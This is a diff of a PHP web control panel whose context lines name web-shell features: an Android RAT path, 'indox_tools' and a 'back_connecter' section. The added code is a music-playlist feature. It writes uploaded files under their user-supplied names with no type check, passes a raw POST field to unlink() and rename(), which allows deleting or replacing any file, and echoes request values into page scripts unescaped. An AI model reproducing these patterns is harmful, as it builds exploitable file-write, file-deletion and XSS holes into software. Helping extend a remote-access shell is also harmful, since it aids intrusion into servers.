@@ -3,7 +3,7 @@
 session_start();
 date_default_timezone_set("Asia/Jakarta");
 
-$version = "v2.9";
+$version = "v3.0";
 
 if(isset($_GET['rat-android-siapa'])) {
         $path = dirname(__FILE__)."/rat/android/";
@@ -372,7 +372,7 @@ if(isset($_GET['indox_tools'])) {
         idx_tools("krdp");
     }
 }
-
+/*
 //move file upload
 while(list($key,$value) = each($_FILES['file']['name']))
 {
@@ -396,6 +396,7 @@ while(list($key,$value) = each($_FILES['file']['name']))
         chmod("$add",0777);
     }
 }
+*/
 // input upload handle
 if (isset($_GET['uploader'])) 
 {
@@ -473,6 +474,40 @@ if (isset($_GET['uploader']))
   
         </body>';
 }
+
+//upload musik file
+if (isset($_FILES["ufilem"] ) && !empty( $_FILES["ufilem"]["name"] ) ) {
+    if ( is_uploaded_file( $_FILES["ufilem"]["tmp_name"] ) && $_FILES["ufilem"]["error"] === 0 ) 
+    {
+        $pathname = "musiktxt/".$_FILES['ufilem']['name'];
+        if(copy($_FILES['ufilem']['tmp_name'], $pathname))
+        {
+            gal_musik_txt();
+        }
+        else {
+            echo '<script>alert("failed to upload")</script>';
+        }
+    }
+}
+if (isset($_POST['musiktxt'])) {
+    $newmusiktxt = $_POST['musiktxt'];
+    $_SESSION['musiktxt'] = $newmusiktxt;
+
+    echo '<script>alert("Updating '.$newmusiktxt.'");</script>';
+
+}
+if (isset($_POST['updmusiktxt'])) {
+    $file = $_POST['updmusiktxtdata'];
+    unlink($file);
+    if (rename($file.".update", $file)) {
+        echo '<script>alert("Success updated")</script>';
+    }
+    else {
+        echo '<script>alert("Failed rename update")</script>';
+    }
+}
+
+
 
 //filemanager
 if(isset($_GET['path']) || isset($_GET['file_manager'])){
@@ -561,6 +596,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
         <option value="gal-image">Galery Image</option>
         <option value="gal-video">Galery Video</option>
         <option value="gal-musik">Galery Musik</option>
+        <option value="gal-musik-txt">Galery Musik Txt</option>
         <option value="gal-doc">Galery Document</option>
         <option value="settings">Settings</option>
         </select>
@@ -925,6 +961,9 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
         procffmpeg('."'".$gdata."'".', 0);
         </script>';
     }
+    elseif(isset($_GET['option']) && $_POST['other'] == 'gal-musik-txt') {
+        gal_musik_txt();
+    }
     elseif(isset($_GET['option']) && $_POST['other'] == 'gal-musik') {
         fm_rdelete('thumbs');
         unlink("playlist.txt");
@@ -988,9 +1027,16 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
         $files = dir_scan($path);
         $outfiles = array();
         $j = 0;
+        $runtext = "";
 
         for ($i=0; $i<count($files); $i++) 
         {
+            if (isset($_SESSION['musiktxtrun'])) {
+                $runtext = "musiktxt/".$_SESSION['musiktxtrun'];
+                echo '<script>alert("Run from Textfile '.$_SESSION['musiktxtrun'].'")</script>';
+                unset($_SESSION['musiktxtrun']);
+                break;
+            }
             if (is_file($files[$i])) 
             {
                 $mime = strtolower(pathinfo($files[$i], PATHINFO_EXTENSION));
@@ -1006,6 +1052,10 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
                     $j++;
                 }
             }
+        }
+        if ($runtext != "") {
+            if (!copy($runtext, "playlist.txt"))
+                echo '<script>alert("failed copy '.$runtext.'");</script>';
         }
         copy("playlist.txt", "playliststart.txt");
         
@@ -1438,7 +1488,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
                     var data = JSON.parse(this.responseText);
                     //alert(data.status);
 
-                    location.href = "/ai-web/ai.php?path=/var/www/html/ai-web/mount";
+                    location.href = "/ai-web/ai.php?path=/mnt1/simpan/htdocs/ai-web/mount";
                 }
             };
             xhr.open("GET", url, true);
@@ -1926,6 +1976,106 @@ if (isset($_GET['back_connecter'])) {
             }
         }
     }
+}
+
+function gal_musik_txt() {
+        if (!file_exists("musiktxt")) {
+            mkdir("musiktxt", 0777, true);
+        }
+        if (!isset($_SESSION['musiktxt'])) {
+            $_SESSION['musiktxt'] = '/mnt/C/Users/taku/Desktop/Best Media';
+        }
+        if (!isset($_SESSION['musiktxtrun'])) {
+            $_SESSION['musiktxtrun'] = 'desktop.txt';
+            echo "<script>alert('select default musikrun')</script>";
+        }
+
+        echo '<form method=post action=""><h3><font color=yellow>Recent file</font>';
+        echo '&nbsp&nbsp&nbsp<input type=text name=musiktxt value="'.$_SESSION['musiktxt'].'"></input>';
+        echo '&nbsp<input type=submit value="Musik folder"></input></h3></form>';
+        echo '<div id=namefile></div><br>';
+        echo '<div id=load></div>';
+
+        echo '
+        <script>
+        function refind(id) {
+            var decid = atob(id);
+            window.open(
+                            "download.php?id=musictextview:"+decid,
+                            "_blank"
+                        );
+        }
+        function run(id) {
+            var xhr = new XMLHttpRequest();
+            var url = "ajax-server.php?idexl=musiktxtsel:"+id;
+
+            xhr.onloadstart = function () {
+                document.title = "Selecting...";
+            }
+            xhr.onreadystatechange = function() {
+                if (this.responseText !== "" && this.readyState == 4) 
+                {
+                    document.title = this.responseText+" selected";
+                    location.reload();
+                }
+            };
+            xhr.open("GET", url, true);
+            xhr.send();
+        }
+        function proc(name, total, title, count) 
+        {
+            var xhr = new XMLHttpRequest();
+            var url = "ajax-server.php?idexl=getline:"+name;
+            var targetpath = "'.$_SESSION['musiktxt'].'";
+
+            xhr.onloadstart = function () {
+                document.getElementById("load").innerHTML = "Loading...";
+                count = count + 1;
+                document.title = "Total: "+count+"/"+total;              
+            }
+            xhr.onreadystatechange = function() {
+                if (this.responseText !== "" && this.readyState == 4) 
+                {
+                    document.getElementById("load").innerHTML = "";                
+                    var data = JSON.parse(this.responseText);
+                    var encid = btoa(data.pathname+":"+data.line+":"+targetpath);
+                    var name = data.name;
+                    var selectedname = "'.$_SESSION['musiktxtrun'].'";
+                    var tanggal = data.tanggal;
+
+                    if (name == selectedname) {
+                        name = "<font color=yellow>⊛ </font>"+selectedname;
+                        tanggal = "<font color=yellow>Selected</font>";
+                    }
+
+                    document.getElementById("namefile").innerHTML += name+"&nbsp&nbsp<b><font color=red >"+data.line+" line</font></b>";
+                    document.getElementById("namefile").innerHTML += "&nbsp&nbsp<input id="+title+" onclick=run(this.id) type=submit value=Select></input>&nbsp&nbsp&nbsp&nbsp&nbsp <input type=submit id="+encid+" onclick=refind(this.id) value=ReFind></input>&nbsp&nbsp"+tanggal+"<br><br>";
+                }
+            };
+            xhr.open("GET", url, true);
+            xhr.send();
+        }
+        </script>
+        ';
+
+        $files = dir_scan("musiktxt");
+
+        for ($i=0; $i<count($files); $i++) 
+        {
+            if (is_file($files[$i])) 
+            {
+                $mime = strtolower(pathinfo($files[$i], PATHINFO_EXTENSION));
+                if ($mime == "txt") 
+                {
+                    echo '<script>proc("'.$files[$i].'", '.count($files).',"'.basename($files[$i]).'", '.$i.');</script>';
+                }
+            }
+        }
+
+        echo '<form action="" method="post" enctype="multipart/form-data">';
+        echo '<br><br><h3><font color=yellow>Create New</font></h3>Text file: <input type="file" name="ufilem">';
+        echo '&nbsp<input type="submit" value="Upload">';
+        echo '</form>';
 }
 
 function lib_installed() {
